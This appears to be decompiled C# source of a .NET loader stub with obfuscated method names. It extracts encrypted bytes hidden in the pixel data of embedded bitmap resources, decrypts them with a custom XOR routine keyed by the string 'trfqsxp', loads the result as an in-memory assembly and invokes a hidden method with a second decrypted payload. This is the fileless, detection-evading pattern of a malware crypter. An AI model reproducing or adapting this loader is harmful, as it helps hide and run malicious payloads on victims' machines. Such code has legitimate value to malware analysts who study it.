using System;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class0
{
	[STAThread]
	public static void Main()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		object objectValue = RuntimeHelpers.GetObjectValue(smethod_2(smethod_0(smethod_1((Bitmap)new ResourceManager("fapojsu", Assembly.GetExecutingAssembly()).GetObject("wcxxioi")), "trfqsxp")));
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "GetTypes", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null));
		object obj = smethod_0(smethod_1((Bitmap)new ResourceManager("fapojsu", Assembly.GetExecutingAssembly()).GetObject("oyqxvdv")), "trfqsxp");
		NewLateBinding.LateCall(objectValue2, (Type)null, "InvokeMember", new object[5]
		{
			"lrufwwe",
			BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod,
			null,
			null,
			new object[1] { RuntimeHelpers.GetObjectValue(obj) }
		}, (string[])null, (Type[])null, (bool[])null, true);
	}

	public static byte[] smethod_0(byte[] byte_0, string string_0)
	{
		byte[] array = Class0.smethod_4(Class0.smethod_3(), string_0);
		for (int i = byte_0.Length * 2 + array.Length; i >= 0; i += -1)
		{
			object object_ = i % byte_0.Length;
			object object_2 = (byte_0[Class0.smethod_5(object_)] ^ array[i % array.Length]) - byte_0[(i + 1) % byte_0.Length] + 256;
			byte_0[Class0.smethod_5(object_)] = Class0.smethod_7(Class0.smethod_6(object_2, (object)256));
		}
		return byte_0;
	}

	public static byte[] smethod_1(Bitmap bitmap_0)
	{
		byte[] array = new byte[Class0.smethod_8((Image)(object)bitmap_0) * Class0.smethod_9((Image)(object)bitmap_0) * 3 - 1 + 1];
		int num = 0;
		for (int i = Class0.smethod_9((Image)(object)bitmap_0) - 1; i >= 0; i += -1)
		{
			int num2 = Class0.smethod_8((Image)(object)bitmap_0) - 1;
			for (int j = 0; j <= num2; j++)
			{
				Color color = Class0.smethod_10(bitmap_0, j, i);
				array[num * 3 + 2] = color.R;
				array[num * 3 + 1] = color.G;
				array[num * 3] = color.B;
				num++;
			}
		}
		byte[] array2 = new byte[BitConverter.ToInt32(array, 0) - 1 + 1];
		Buffer.BlockCopy(array, 4, array2, 0, array2.Length);
		return array2;
	}

	public static object smethod_2(byte[] byte_0)
	{
		return Class0.smethod_12(Class0.smethod_11(), byte_0);
	}

	static Encoding smethod_3()
	{
		return Encoding.ASCII;
	}

	static byte[] smethod_4(Encoding encoding_0, string string_0)
	{
		return encoding_0.GetBytes(string_0);
	}

	static int smethod_5(object object_0)
	{
		return Conversions.ToInteger(object_0);
	}

	static object smethod_6(object object_0, object object_1)
	{
		return Operators.ModObject(object_0, object_1);
	}

	static byte smethod_7(object object_0)
	{
		return Conversions.ToByte(object_0);
	}

	static int smethod_8(Image image_0)
	{
		return image_0.get_Width();
	}

	static int smethod_9(Image image_0)
	{
		return image_0.get_Height();
	}

	static Color smethod_10(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static AppDomain smethod_11()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_12(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}
}
